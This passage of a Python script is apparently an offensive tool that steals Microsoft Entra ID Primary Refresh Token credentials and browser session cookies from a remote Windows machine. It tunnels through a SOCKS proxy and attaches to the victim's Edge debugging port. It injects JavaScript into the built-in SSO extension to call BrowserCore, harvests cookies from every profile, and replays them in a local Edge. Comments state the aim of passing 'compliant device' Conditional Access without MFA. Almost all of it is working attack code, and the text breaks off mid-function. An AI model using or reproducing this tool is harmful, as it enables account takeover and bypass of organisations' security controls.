import argparse, atexit, json, os, shutil, subprocess, sys, time, threading, traceback
import requests
try:
    import websocket
    if not hasattr(websocket, 'create_connection'):
        raise ImportError("wrong package")
except ImportError:
    sys.exit("[!] websocket-client is not installed. Run:  pip install websocket-client")

# ---------------------------------------------------------------------------
# Static config (not user-facing)
# ---------------------------------------------------------------------------
EDGE_EXE          = os.path.expandvars(
    r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe")
if not os.path.exists(EDGE_EXE):
    EDGE_EXE = os.path.expandvars(
        r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe")

EDGE_DEBUG_PORT   = 9224          # updated per-instance by _pick_instance_slot()
EDGE_PROFILE      = os.path.join(os.environ.get("USERPROFILE", os.path.expanduser("~")),
                                  "EdgePrtProfile")  # updated per-instance

# Lock files — one per running instance, stored as <pid>.lock in _LOCK_DIR.
# Used to detect concurrent instances and assign unique profiles / ports.
_LOCK_DIR      = os.path.join(os.environ.get("TEMP", os.path.expanduser("~")),
                               "browser-proxy-locks")
_OWN_LOCK_FILE = ""   # set by _pick_instance_slot()
# Jelle's SSO extension (ported and modified for chromium)
WIN_ACCOUNTS_EXT  = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                  "WinAccountsExt")

# Populated from CLI args in __main__ before any function is called
AGENT_URL           = ""
SOCKS_PROXY         = ""
EDGE_PROXY          = ""   # proxy URL passed to Edge's --proxy-server
ENTRA_CDP_PORT           = 0   # >0 → bypass PrtAgent, talk directly to Entra Edge CDP
ENTRA_CDP_PROFILE        = 0   # 0 = all profiles; N = use profile N (1-based); -1 = disabled (cookies only)
ENTRA_CDP_COOKIE_PROFILE = 0   # 0 = all profiles; N = cookie fetch uses only profile N (1-based)
_session_cookies = []   # live ESTS cookies from Entra machine, refreshed at startup
# ---------------------------------------------------------------------------


def _agent_session() -> requests.Session:
    """Return a requests.Session configured to reach the agent (with optional SOCKS)."""
    s = requests.Session()
    if SOCKS_PROXY:
        s.proxies = {"http": SOCKS_PROXY, "https": SOCKS_PROXY}
    return s


def _socks_proxy_tuple():
    """Parse SOCKS_PROXY into (host, port, type) for websocket-client, or None.
    e.g. 'socks5h://127.0.0.1:1080'  →  ('127.0.0.1', 1080, 'socks5h')
    """
    if not SOCKS_PROXY:
        return None
    import re
    m = re.match(r'(socks[^:]+)://([^:]+):(\d+)', SOCKS_PROXY)
    if not m:
        return None
    return (m.group(2), int(m.group(3)), m.group(1))


def _prt_extract_remote(url: str) -> list:
    """POST the authorize URL to PrtAgent and return all credential dicts.
    Each dict has 'name' and 'data' keys.
    BrowserCore typically returns two credentials:
      - x-ms-RefreshTokenCredential  (HS256, proves user identity via PRT)
      - x-ms-DeviceCredential        (RS256, proves device compliance via device cert)
    Both must be injected to satisfy Conditional Access 'compliant device' policies.
    Without x-ms-DeviceCredential, AAD falls back to MFA even with a valid PRT.
    """
    with _agent_session() as s:
        resp = s.post(
            "{}/extract".format(AGENT_URL),
            json={"url": url},
            timeout=30,
        )
        resp.raise_for_status()
        creds = resp.json()["credentials"]
        if not isinstance(creds, list):
            creds = [creds]
        # Strip trailing cookie attributes (e.g. ";path=/;domain=...") from data
        return [{"name": c["name"], "data": c["data"].split(";")[0].strip()} for c in creds]


def _fetch_session_cookies() -> list:
    """GET /session from PrtAgent on the Entra machine.
    Returns a list of cookie dicts (name, value, domain, path, secure,
    httpOnly, expires, sameSite) ready to pass straight to CDP Network.setCookie.
    Returns [] on any error so the PRT flow can act as fallback.
    """
    try:
        with _agent_session() as s:
            resp = s.get("{}/session".format(AGENT_URL), timeout=45)
            resp.raise_for_status()
            cookies = resp.json().get("cookies", [])
            print("[+] Received {} session cookie(s) from Entra machine.".format(len(cookies)))
            return cookies
    except Exception as e:
        print("[!] Could not fetch session cookies: {}".format(e))
        return []


def kill_agent() -> bool:
    """POST /kill to PrtAgent — shuts down the remote agent process gracefully.
    Returns True on success, False if the agent could not be reached.
    """
    try:
        with _agent_session() as s:
            resp = s.post("{}/kill".format(AGENT_URL), timeout=10)
            data = resp.json()
            print("[+] Agent kill: {}".format(data.get("status", resp.text)))
            return True
    except Exception as e:
        print("[!] kill_agent failed: {}".format(e))
        return False


# ---------------------------------------------------------------------------
# CDP helpers  (identical to sync_auth.py)
# ---------------------------------------------------------------------------
class CDPSession:
    def __init__(self, ws_url, connect_timeout=10, recv_timeout=30, proxy=None):
        """
        proxy: optional (host, port, type) tuple for websocket-client SOCKS support,
               e.g. ('127.0.0.1', 1080, 'socks5h').  Use _socks_proxy_tuple().
        """
        self._ws_url = ws_url
        ws_kwargs = dict(timeout=connect_timeout, suppress_origin=True)
        if proxy:
            ws_kwargs["http_proxy_host"] = proxy[0]
            ws_kwargs["http_proxy_port"] = proxy[1]
            ws_kwargs["proxy_type"]      = proxy[2]
        self.ws = websocket.create_connection(ws_url, **ws_kwargs)
        # Switch to a longer recv timeout after connect so slow agent calls
        # don't cause the socket to drop while waiting for a CDP response.
        self.ws.sock.settimeout(recv_timeout)
        self._id = 0
        self._lock = threading.Lock()   # guards send+recv pairs
        self._closed = False

    def send(self, method, params=None):
        with self._lock:
            if self._closed:
                raise RuntimeError("CDPSession already closed")
            self._id += 1
            msg_id = self._id
            payload = json.dumps({"id": msg_id, "method": method, "params": params or {}})
            self.ws.send(payload)
            while True:
                raw = self.ws.recv()
                msg = json.loads(raw)
                if msg.get("id") == msg_id:
                    if "error" in msg:
                        raise RuntimeError("CDP {}: {}".format(method, msg["error"]))
                    return msg.get("result", {})
                # Discard events / responses for other ids without blocking

    def send_nowait(self, method, params=None):
        """Send a CDP command without waiting for the response.

        Used for Page.navigate: Edge destroys the page's CDP endpoint during
        navigation, so the response frame is never delivered and recv() would
        block until the socket timeout fires.
        """
        with self._lock:
            if self._closed:
                return
            self._id += 1
            payload = json.dumps({"id": self._id, "method": method, "params": params or {}})
            self.ws.send(payload)

    def ping(self):
        """Send a no-op CDP command to keep the WebSocket alive."""
        try:
            with self._lock:
                if self._closed:
                    return
                self._id += 1
                msg_id = self._id
                self.ws.send(json.dumps({"id": msg_id, "method": "Target.getTargetInfo", "params": {}}))
                # Don't wait for a response — just flush the write path
        except Exception:
            pass

    def is_alive(self):
        """Return True if the underlying TCP connection looks healthy."""
        try:
            return self.ws.connected
        except Exception:
            return False

    def close(self):
        self._closed = True
        try:
            self.ws.close()
        except Exception:
            pass


def _get_tabs(port):
    r = requests.get("http://127.0.0.1:{}/json".format(port), timeout=5)
    r.raise_for_status()
    return [t for t in r.json() if t.get("type") == "page"]


class BrowserLevelCDPSession:
    """Connect to Edge's *browser-level* CDP WS (from /json/version).

    Supports flat-session commands (sessionId field) needed for cross-target
    operations such as Target.createTarget / Target.attachToTarget.
    All calls are sequential (no internal locking needed).
    """
    def __init__(self, ws_url, timeout=20, proxy=None):
        """
        proxy: optional (host, port, type) tuple, e.g. ('127.0.0.1', 1080, 'socks5h').
               Use _socks_proxy_tuple() to build from the global SOCKS_PROXY string.
        """
        ws_kwargs = dict(timeout=timeout, suppress_origin=True)
        if proxy:
            ws_kwargs["http_proxy_host"] = proxy[0]
            ws_kwargs["http_proxy_port"] = proxy[1]
            ws_kwargs["proxy_type"]      = proxy[2]
        self.ws   = websocket.create_connection(ws_url, **ws_kwargs)
        self.ws.sock.settimeout(timeout)
        self._id  = 0

    # ------------------------------------------------------------------
    def _next_id(self):
        self._id += 1
        return self._id

    def _recv_until(self, predicate, timeout=15):
        """Read frames until predicate(parsed_msg) is True; return that message.
        Returns None on timeout or socket error.
        """
        deadline = time.time() + timeout
        while time.time() < deadline:
            remaining = deadline - time.time()
            self.ws.sock.settimeout(max(0.1, remaining))
            try:
                raw = self.ws.recv()
            except Exception:
                return None
            try:
                msg = json.loads(raw)
            except Exception:
                continue
            if predicate(msg):
                return msg
        return None

    def cmd(self, method, params=None, session_id=None, timeout=15):
        """Send a CDP command and wait for its response."""
        cid     = self._next_id()
        payload = {"id": cid, "method": method, "params": params or {}}
        if session_id:
            payload["sessionId"] = session_id
        self.ws.send(json.dumps(payload))

        def _match(m):
            if m.get("id") != cid:
                return False
            if session_id and m.get("sessionId") != session_id:
                return False
            return True

        msg = self._recv_until(_match, timeout=timeout)
        if msg is None:
            raise RuntimeError("CDP {} timed out ({}s)".format(method, timeout))
        if "error" in msg:
            raise RuntimeError("CDP {}: {}".format(method, msg["error"]))
        return msg.get("result", {})

    def send_nowait(self, method, params=None, session_id=None):
        """Send a CDP command without waiting for the response frame."""
        cid     = self._next_id()
        payload = {"id": cid, "method": method, "params": params or {}}
        if session_id:
            payload["sessionId"] = session_id
        self.ws.send(json.dumps(payload))
        return cid

    def drain_id(self, cid, session_id=None, timeout=5):
        """Wait for a specific (cid, optional sessionId) response, discarding others."""
        def _match(m):
            if m.get("id") != cid:
                return False
            if session_id and m.get("sessionId") != session_id:
                return False
            return True
        return self._recv_until(_match, timeout=timeout)

    def close(self):
        try:
            self.ws.close()
        except Exception:
            pass


def _page_session(port, tab):
    ws = tab["webSocketDebuggerUrl"].replace(
        "127.0.0.1:{}".format(port), "127.0.0.1:{}".format(port))
    return CDPSession(ws)


# ---------------------------------------------------------------------------
# Direct Entra CDP helpers (--entra-cdp-port mode, no PrtAgent needed)
# ---------------------------------------------------------------------------

def _entra_cdp_get_profiles(entra_cdp_port):
    """Return a list of profile dicts from the Entra machine's Edge via CDP.
    Each dict has:
      index            – 1-based display index
      browserContextId – Edge's internal context ID (empty string for default profile)
      pages            – list of (title, url) for pages in this profile
      label            – human-readable name built from page titles/URLs
      has_sso_ext      – True if the built-in SSO extension SW was found in this profile
    """
    BUILTIN_EXT_ID = "ppnbnpeolgkicgegkbkbjmhlideopiji"
    proxy = _socks_proxy_tuple()
    try:
        with _agent_session() as s:
            r = s.get("http://127.0.0.1:{}/json/version".format(entra_cdp_port), timeout=5)
        r.raise_for_status()
        browser_ws = r.json().get("webSocketDebuggerUrl", "")
        if not browser_ws:
            return []
        bsess = BrowserLevelCDPSession(browser_ws, proxy=proxy)
        try:
            bsess.cmd("Target.setDiscoverTargets", {"discover": True}, timeout=5)
            res = bsess.cmd("Target.getTargets", timeout=5)
            page_targets = [t for t in res.get("targetInfos", []) if t.get("type") == "page"]

            # Group by browserContextId; keep one representative page per profile
            ctx_order, ctx_pages, ctx_rep = [], {}, {}
            for t in page_targets:
                ctx = t.get("browserContextId", "")
                if ctx not in ctx_pages:
                    ctx_order.append(ctx)
                    ctx_pages[ctx] = []
                    ctx_rep[ctx] = t
                ctx_pages[ctx].append((t.get("title", ""), t.get("url", "")))

            # Wake the SSO extension SW from one page per profile so we can
            # detect it reliably even if it was terminated.
            for ctx, pt in ctx_rep.items():
                page_ws = "ws://127.0.0.1:{}/devtools/page/{}".format(
                    entra_cdp_port, pt["targetId"])
                try:
                    page_sess = CDPSession(page_ws, proxy=proxy, recv_timeout=5)
                    try:
                        page_sess.send("ServiceWorker.enable", {})
                        try:
                            page_sess.send("ServiceWorker.startWorker",
                                           {"scopeURL": "chrome-extension://{}/".format(
                                               BUILTIN_EXT_ID)})
                        except Exception:
                            pass
                    finally:
                        page_sess.close()
                except Exception:
                    pass

            if ctx_order:
                time.sleep(1.0)   # let SWs start up

            # Re-enumerate targets and record which contexts have the extension
            res2 = bsess.cmd("Target.getTargets", timeout=5)
            sso_contexts = {
                t.get("browserContextId", "")
                for t in res2.get("targetInfos", [])
                if BUILTIN_EXT_ID in t.get("url", "")
            }
        finally:
            bsess.close()

        profiles = []
        for i, ctx in enumerate(ctx_order, start=1):
            pages = ctx_pages[ctx]
            label_parts = []
            for title, url in pages:
                if title and title.lower() not in ("new tab", "", "about:blank"):
                    label_parts.append(title[:50])
                elif url and url not in ("about:blank", "about:newtab", ""):
                    label_parts.append(url[:60])
            label = " | ".join(label_parts[:3]) or "(no open pages)"
            profiles.append({
                "index":           i,
                "browserContextId": ctx,
                "pages":           pages,
                "label":           label,
                "has_sso_ext":     ctx in sso_contexts,
            })
        return profiles
    except Exception as e:
        print("[!] Could not enumerate Entra profiles: {}".format(e))
        return []


def _entra_cdp_session_cookies(entra_cdp_port):
    """Fetch cookies from ALL profiles on the Entra machine's Edge via CDP.

    Each Edge/Chrome profile has its own isolated cookie store bounded by its
    browserContextId.  We use the browser-level CDP to enumerate all page
    targets, group them by browserContextId, pick one representative page per
    profile, call Network.getAllCookies on each, and merge the results.
    Cookies that are identical across profiles (same name+domain+path) are
    deduplicated so the local Edge cookie store ends up with one canonical copy.

    Both the HTTP probe and all WebSocket connections are routed through SOCKS.
    Returns a list of cookie dicts identical to what PrtAgent /session returns.
    """
    proxy = _socks_proxy_tuple()
    try:
        with _agent_session() as s:
            resp = s.get(
                "http://127.0.0.1:{}/json/version".format(entra_cdp_port), timeout=5)
        resp.raise_for_status()
        browser_ws = resp.json().get("webSocketDebuggerUrl")
        if not browser_ws:
            raise RuntimeError("No webSocketDebuggerUrl in /json/version")

        bsess = BrowserLevelCDPSession(browser_ws, proxy=proxy)
        try:
            res = bsess.cmd("Target.getTargets", timeout=5)
        finally:
            bsess.close()

        all_targets = res.get("targetInfos", [])
        pages = [t for t in all_targets if t.get("type") == "page"]
        if not pages:
            print("[!] No page targets on Entra CDP port {}".format(entra_cdp_port))
            return []

        # Group by browserContextId; fall back to targetId uniqueness if absent
        ctx_order, ctx_map = [], {}
        for t in pages:
            ctx = t.get("browserContextId") or t["targetId"]
            if ctx not in ctx_map:
                ctx_order.append(ctx)
                ctx_map[ctx] = t

        all_profile_targets = [ctx_map[c] for c in ctx_order]

        # Apply --entra-cdp-cookie-profile filter
        if ENTRA_CDP_COOKIE_PROFILE > 0:
            if ENTRA_CDP_COOKIE_PROFILE <= len(all_profile_targets):
                profile_pages = [all_profile_targets[ENTRA_CDP_COOKIE_PROFILE - 1]]
                print("[+] Entra CDP: using profile {} of {} for cookie fetch.".format(
                    ENTRA_CDP_COOKIE_PROFILE, len(all_profile_targets)))
            else:
                print("[!] --entra-cdp-cookie-profile {} out of range ({} profile(s)) — using all".format(
                    ENTRA_CDP_COOKIE_PROFILE, len(all_profile_targets)))
                profile_pages = all_profile_targets
        else:
            profile_pages = all_profile_targets

        print("[+] Entra CDP: {} profile(s) detected, fetching cookies from {} ...".format(
            len(all_profile_targets), len(profile_pages)))

        merged = {}   # (name, domain, path) → cookie dict  (dedup across profiles)
        for t in profile_pages:
            # webSocketDebuggerUrl is absent from Target.getTargets results —
            # construct the WS URL directly from the known CDP format.
            ws_url = "ws://127.0.0.1:{}/devtools/page/{}".format(
                entra_cdp_port, t["targetId"])
            try:
                sess = CDPSession(ws_url, proxy=proxy, recv_timeout=10)
                try:
                    result = sess.send("Network.getAllCookies")
                finally:
                    sess.close()
                cookies = result.get("cookies", [])
                for c in cookies:
                    key = (c.get("name", ""), c.get("domain", ""), c.get("path", ""))
                    merged[key] = c
                print("[+]   Profile (ctx={}) → {} cookie(s)".format(
                    (t.get("browserContextId") or "default")[:16], len(cookies)))
            except Exception as e:
                print("[!]   Could not fetch cookies for profile {}: {}".format(
                    (t.get("browserContextId") or t["targetId"])[:16], e))

        all_cookies = list(merged.values())
        print("[+] Entra CDP: {} unique cookie(s) across {} profile(s).".format(
            len(all_cookies), len(profile_pages)))
        return all_cookies
    except Exception as e:
        print("[!] Could not fetch Entra session cookies via CDP: {}".format(e))
        return []


def _parse_browsercore_response(json_str):
    """Parse BrowserCore NativeMessaging JSON response into SsoCookie-style dicts.
    Expected shape: {"response":{"Cookies":[{"Name":"...","Data":"..."},...]}}
    Returns list of {"name": ..., "data": ...} dicts.
    """
    try:
        obj = json.loads(json_str)
    except Exception:
        return []
    # BrowserCore response shapes:
    #   {"response": [{"name":"...","data":"..."}]}            ← direct list
    #   {"response": {"Cookies": [{"Name":"...","Data":"..."}]}}  ← dict with Cookies
    inner = obj.get("response", obj) if isinstance(obj, dict) else obj
    if isinstance(inner, list):
        cookies = inner
    elif isinstance(inner, dict):
        cookies = inner.get("Cookies") or inner.get("cookies") or []
    else:
        cookies = []
    result = []
    for c in cookies:
        name = c.get("Name") or c.get("name", "")
        data = c.get("Data") or c.get("data", "")
        if name and data:
            data = data.split(";")[0].strip()
            result.append({"name": name, "data": data})
    return result


def _entra_cdp_extract(entra_cdp_port, url):
    """Extract PRT credentials by connecting to the Entra SSO extension service
    worker on the Entra machine's Edge via CDP, then calling connectNative to
    BrowserCore.exe — the same path Edge's built-in SSO uses.

    Flow:
      1. GET /json/version  → browser-level WS URL
      2. Target.setDiscoverTargets(true)  → wakes dormant MV3 service workers
      3. Sleep 600 ms to let workers start
      4. Target.getTargets  → collect worker/SW/background-page targets
         • prefer targets whose URL contains the Entra SSO extension ID
         • fall back to any type=worker / service_worker / background_page
      5. For each candidate:
         a. Target.attachToTarget (flat session)
         b. Runtime.enable → wait up to 3 s for ACK (skip dead targets)
         c. Runtime.evaluate(connectNative Promise, awaitPromise=true, 20 s)
            • 'no-chrome-runtime'   → wrong worker, try next
            • exceptionDetails      → wrong context or BrowserCore error, try next
            • value present         → parse BrowserCore JSON, return cookies
      6. Raise if no candidate returned cookies.
    """
    # Extension ID for the Windows built-in SSO extension (ships with Windows,
    # registered as com.microsoft.browsercore native messaging host).
    BUILTIN_EXT_ID = "ppnbnpeolgkicgegkbkbjmhlideopiji"

    # JS injected into the extension SW: one-shot sendNativeMessage to BrowserCore.
    JS_BUILTIN = (
        "new Promise(function(resolve,reject){{"
        "if(typeof chrome==='undefined'||typeof chrome.runtime==='undefined')"
        "{{reject('no-chrome-runtime');return;}}"
        "chrome.runtime.sendNativeMessage("
        "'com.microsoft.browsercore',"
        "{{method:'GetCookies',uri:{uri},sender:'https://login.microsoftonline.com'}},"
        "function(r){{"
        "if(chrome.runtime.lastError)"
        "{{reject(chrome.runtime.lastError.message||'lastError');return;}}"
        "if(!r){{reject('null-response');return;}}"
        "resolve(JSON.stringify(r));"
        "}});"
        "}})"  
    )

    proxy = _socks_proxy_tuple()
    with _agent_session() as s:
        r = s.get(
            "http://127.0.0.1:{}/json/version".format(entra_cdp_port), timeout=5)
    r.raise_for_status()
    browser_ws = r.json().get("webSocketDebuggerUrl")
    if not browser_ws:
        raise RuntimeError("No webSocketDebuggerUrl in /json/version on port {}".format(
            entra_cdp_port))
    # Keep 127.0.0.1 in the WS URL — 127.0.0.1 resolves to ::1 on the remote machine
    # through SOCKS, but Edge only listens on 127.0.0.1.
    print("[entra-cdp] Browser WS: {}".format(browser_ws))

    bsess = BrowserLevelCDPSession(browser_ws, proxy=proxy)
    try:
        # 2. Wake MV3 service workers via ServiceWorker.startWorker on ONE PAGE PER
        #    PROFILE.  setDiscoverTargets alone cannot revive terminated MV3 SWs, and
        #    ServiceWorker.startWorker is scoped to the profile (browserContextId) of
        #    the page we send it to.  We therefore enumerate all page targets, group by
        #    browserContextId, and wake both extension SWs from each profile's page.
        bsess.cmd("Target.setDiscoverTargets", {"discover": True}, timeout=5)
        res_targets = bsess.cmd("Target.getTargets", timeout=5)
        all_targets_early = res_targets.get("targetInfos", [])
        page_targets = [t for t in all_targets_early if t.get("type") == "page"]

        # Group pages by browserContextId; respect ENTRA_CDP_PROFILE filter
        ctx_order, ctx_pages = [], {}
        for t in page_targets:
            ctx = t.get("browserContextId") or t["targetId"]
            if ctx not in ctx_pages:
                ctx_order.append(ctx)
                ctx_pages[ctx] = t   # keep one representative page per profile

        # Build ordered profile list and apply profile filter
        all_profile_ctxs = ctx_order
        if ENTRA_CDP_PROFILE > 0:
            if ENTRA_CDP_PROFILE <= len(all_profile_ctxs):
                selected_ctx = {all_profile_ctxs[ENTRA_CDP_PROFILE - 1]}
            else:
                print("[!] --entra-cdp-profile {} out of range ({} profile(s) found) — using all".format(
                    ENTRA_CDP_PROFILE, len(all_profile_ctxs)))
                selected_ctx = set(all_profile_ctxs)
        else:
            selected_ctx = set(all_profile_ctxs)

        profile_pages = [ctx_pages[ctx] for ctx in all_profile_ctxs if ctx in selected_ctx]

        print("[entra-cdp] {} profile(s) total, waking SWs in {} ...".format(
            len(all_profile_ctxs), len(profile_pages)))

        for pt in profile_pages:
            # webSocketDebuggerUrl is only present in the HTTP /json/list response,
            # NOT in Target.getTargets CDP results.  Construct it from the known
            # CDP URL format: ws://127.0.0.1:<port>/devtools/page/<targetId>
            page_ws = "ws://127.0.0.1:{}/devtools/page/{}".format(
                entra_cdp_port, pt["targetId"])
            ctx_label = (pt.get("browserContextId") or "default")[:16]
            try:
                page_sess = CDPSession(page_ws, proxy=proxy, recv_timeout=5)
                try:
                    page_sess.send("ServiceWorker.enable", {})
                    scope = "chrome-extension://{}/".format(BUILTIN_EXT_ID)
                    try:
                        page_sess.send("ServiceWorker.startWorker", {"scopeURL": scope})
                        print("[entra-cdp] startWorker OK for {} (profile {})".format(
                            BUILTIN_EXT_ID[:16], ctx_label))
                    except Exception as e:
                        print("[entra-cdp] startWorker {} (profile {}): {}".format(
                            BUILTIN_EXT_ID[:16], ctx_label, e))
                except Exception as e:
                    print("[entra-cdp] ServiceWorker domain unavailable (profile {}): {}".format(
                        ctx_label, e))
                finally:
                    page_sess.close()
            except Exception as e:
                print("[entra-cdp] Could not connect to page (profile {}): {}".format(
                    ctx_label, e))

        if profile_pages:
            time.sleep(1.0)   # let SWs start up across all profiles
        else:
            print("[entra-cdp] no page targets — skipping SW wake")

        # 4. Re-enumerate targets now that SWs have been woken across all profiles
        res        = bsess.cmd("Target.getTargets", timeout=5)
        all_targets = res.get("targetInfos", [])
        print("[entra-cdp] {} targets total".format(len(all_targets)))

        # 5. Build candidate list: exact SSO/proxy ext URL matches first, then any worker.
        #    Both lists are restricted to selected_ctx when a profile filter is active —
        #    extension workers from other profiles are skipped entirely.
        exact, workers = [], []
        for t in all_targets:
            t_url  = t.get("url",  "")
            t_type = t.get("type", "")
            t_ctx  = t.get("browserContextId", "")
            in_selected = (t_ctx in selected_ctx) or (not t_ctx)
            if not in_selected:
                continue
            if BUILTIN_EXT_ID in t_url:
                exact.append(t)
            elif t_type in ("worker", "service_worker", "background_page"):
                workers.append(t)

        candidates = exact + workers
        seen_ids, unique_candidates = set(), []
        for t in candidates:
            if t["targetId"] not in seen_ids:
                seen_ids.add(t["targetId"])
                unique_candidates.append(t)

        if not unique_candidates:
            raise RuntimeError(
                "No worker/service-worker targets found on Entra Edge CDP. "
                "Make sure Edge is running with the Entra SSO extension loaded "
                "(--load-extension=<path>) and the user is signed in.")

        print("[entra-cdp] {} candidate(s): {}".format(
            len(unique_candidates),
            ", ".join(t["targetId"][:12] for t in unique_candidates)))

        # 6. Try candidates in order; return immediately on the first success.
        for candidate in unique_candidates:
            target_id  = candidate["targetId"]
            t_url      = candidate.get("url", "")
            t_type     = candidate.get("type", "?")

            print("[entra-cdp] Trying {} (type={} url={})".format(
                target_id[:16], t_type, t_url[:60] if t_url else "?"))

            # a. Attach (flat session)
            try:
                res = bsess.cmd("Target.attachToTarget",
                                {"targetId": target_id, "flatten": True}, timeout=5)
            except Exception as e:
                print("[entra-cdp]   attach failed: {}".format(e))
                continue
            sid = res.get("sessionId")
            if not sid:
                print("[entra-cdp]   no sessionId")
                continue
            print("[entra-cdp]   session: {}".format(sid))

            # b. Runtime.enable — wait up to 3 s for ACK before evaluating
            cid = bsess.send_nowait("Runtime.enable", {}, session_id=sid)
            ack = bsess.drain_id(cid, session_id=sid, timeout=3)
            if ack is None:
                print("[entra-cdp]   Runtime.enable no ACK — skipping")
                continue
            print("[entra-cdp]   Runtime.enable OK, evaluating ...")

            # c. Evaluate the NativeMessage call; return on first valid response.
            js = JS_BUILTIN.format(uri=json.dumps(url))
            cid = bsess.send_nowait("Runtime.evaluate", {
                "expression":    js,
                "awaitPromise":  True,
                "returnByValue": True,
            }, session_id=sid)
            msg = bsess.drain_id(cid, session_id=sid, timeout=20)

            if msg is None:
                print("[entra-cdp]   evaluate timed out")
                continue

            inner  = msg.get("result", {})
            exc    = inner.get("exceptionDetails")
            result = inner.get("result", {})

            if exc:
                exc_text = (exc.get("exception", {}) or {}).get("value", "") \
                         or exc.get("text", "") or str(exc)
                print("[entra-cdp]   evaluate threw: {}".format(exc_text))
                continue

            value = result.get("value", "")
            if not value:
                print("[entra-cdp]   empty result value")
                continue

            print("[entra-cdp]   response: {}".format(value[:120]))

            creds = _parse_browsercore_response(value)
            if not creds:
                print("[entra-cdp]   could not parse BrowserCore response")
                continue

            print("[entra-cdp]   got {} cred(s) from {} — done".format(
                len(creds), target_id[:16]))
            return creds

        raise RuntimeError(
            "No worker target responded to connectNative('com.microsoft.browsercore'). "
            "Check that Edge on the Entra machine has the built-in SSO extension active "
            "and the user is signed in interactively at least once.")
    finally:
        bsess.close()


# ---------------------------------------------------------------------------
# Instance-slot management
# ---------------------------------------------------------------------------
def _pick_instance_slot():
    """Claim a per-PID lock file and return (is_first, profile_dir, cdp_port).

    Scans _LOCK_DIR for live <pid>.lock files (stale ones are pruned).  The
    number of live instances already running determines the slot index:
      slot 0  → EdgePrtProfile,   port 9224  (first instance)
      slot N  → EdgePrtProfile_N, port 9224+N (subsequent instances)

    is_first=True means no other instance was running when we started, so
    _launch_edge will erase all pre-existing EdgePrtProfile* directories.
    """
    os.makedirs(_LOCK_DIR, exist_ok=True)
    live_pids = []
    for fname in os.listdir(_LOCK_DIR):
        if not fname.endswith(".lock"):
            continue
        try:
            pid = int(fname[:-5])
        except ValueError:
            continue
        out = subprocess.run(
            ["tasklist", "/FI", "PID eq {}".format(pid), "/NH"],
            capture_output=True, text=True).stdout
        if str(pid) in out:
            live_pids.append(pid)
        else:
            try:
                os.remove(os.path.join(_LOCK_DIR, fname))
            except Exception:
                pass

    idx      = len(live_pids)
    is_first = (idx == 0)
    base     = os.path.join(os.environ.get("USERPROFILE", os.path.expanduser("~")),
                            "EdgePrtProfile")
    profile  = base if idx == 0 else "{}_{}" .format(base, idx)
    port     = 9224 + idx

    lock_file = os.path.join(_LOCK_DIR, "{}.lock".format(os.getpid()))
    try:
        with open(lock_file, "w") as fh:
            fh.write(str(os.getpid()))
        globals()["_OWN_LOCK_FILE"] = lock_file
    except Exception as e:
        print("[!] Could not write lock file: {}".format(e))

    return is_first, profile, port


def _remove_lock():
    """Remove this instance's lock file on exit (atexit handler)."""
    if _OWN_LOCK_FILE and os.path.exists(_OWN_LOCK_FILE):
        try:
            os.remove(_OWN_LOCK_FILE)
        except Exception:
            pass

atexit.register(_remove_lock)


# ---------------------------------------------------------------------------
# Edge launcher
# ---------------------------------------------------------------------------
def _launch_edge(is_first):
    # If we are the first instance, wipe all pre-existing EdgePrtProfile*
    # directories so we start from a clean cookie/cache state.
    # Stale ESTS cookies or a cached brcap=0 value would cause AAD to skip
    # BssoInterrupt or silently reject a replayed PRT credential.
    if is_first:
        parent    = os.path.dirname(EDGE_PROFILE)
        base_name = os.path.basename(EDGE_PROFILE)
        try:
            entries = os.listdir(parent)
        except Exception:
            entries = []
        for entry in entries:
            if entry == base_name or entry.startswith(base_name + "_"):
                full = os.path.join(parent, entry)
                if os.path.isdir(full):
                    for attempt in range(6):
                        try:
                            shutil.rmtree(full)
                            print("[+] Cleared old Edge profile: {}".format(full))
                            break
                        except Exception as e:
                            if attempt < 5:
                                time.sleep(0.5)
                            else:
                                print("[!] Could not clear profile ({}): {}".format(full, e))

    edge_proxy = EDGE_PROXY.replace("socks5h://", "socks5://") if EDGE_PROXY else "direct://"
    print("[+] Launching Edge  profile={}  proxy={}".format(EDGE_PROFILE, edge_proxy))
    args = [
        EDGE_EXE,
        "--remote-debugging-port={}".format(EDGE_DEBUG_PORT),
        "--remote-allow-origins=*",
        "--user-data-dir={}".format(EDGE_PROFILE),
        "--no-first-run",
        "--no-default-browser-check",
        # Route all Edge traffic through the configured edge proxy.
        # Edge expects "socks5://host:port"; strip the "h" suffix from socks5h://.
        "--proxy-server={}".format(edge_proxy),
        "--proxy-bypass-list=127.0.0.1;127.0.0.1;[::1]",  # keep CDP/local traffic direct
        # QUIC (HTTP/3) is UDP-based and cannot traverse a SOCKS5 proxy (TCP only).
        # Without this flag Edge attempts QUIC to portal.azure.com, the proxy drops
        # the UDP packets, and when Edge falls back to TCP mid-session the TLS record
        # MAC is already corrupt → ERR_SSL_BAD_RECORD_MAC_ALERT on all portal APIs.
        "--disable-quic",
        # Prevent TLS version/cipher negotiation issues through the SOCKS tunnel.
        "--ssl-version-min=tls1.2",
        "about:blank",
    ]
    # Load the Windows SSO extension so BssoInterrupt_Core.js activates on the
    # AAD login page.  The content script sets brcap=1 at document_start, which
    # is required for AAD to look for the x-ms-RefreshTokenCredential cookie.
    if os.path.isdir(WIN_ACCOUNTS_EXT):
        args.insert(-1, "--load-extension={}".format(WIN_ACCOUNTS_EXT))
    else:
        print("[!] WinAccountsExt not found at {} — brcap=1 will be missing!".format(
            WIN_ACCOUNTS_EXT))
    subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            requests.get("http://127.0.0.1:{}/json".format(EDGE_DEBUG_PORT), timeout=2)
            print("[+] Edge ready.")
            return
        except Exception:
            time.sleep(0.5)
    raise RuntimeError("Edge did not start within 15 s")


def _prefetch_prt_creds() -> list:
    """Follow myaccount.microsoft.com redirects (via SOCKS) to capture a live AAD
    authorize URL, then extract PRT credentials for that URL.

    Returns a list of {"name", "data"} dicts (same shape as _prt_extract_remote),
    or [] on any error so the caller can silently skip pre-injection.
    """
    if ENTRA_CDP_PROFILE == -1:
        print("[*] PRT extraction disabled (cookies-only mode) — skipping prefetch.")
        return []
    auth_url = None
    try:
        with _agent_session() as s:
            resp = s.get(
                "https://myaccount.microsoft.com/",
                allow_redirects=True,
                timeout=20,
            )
        for r in resp.history:
            loc = r.headers.get("location", "")
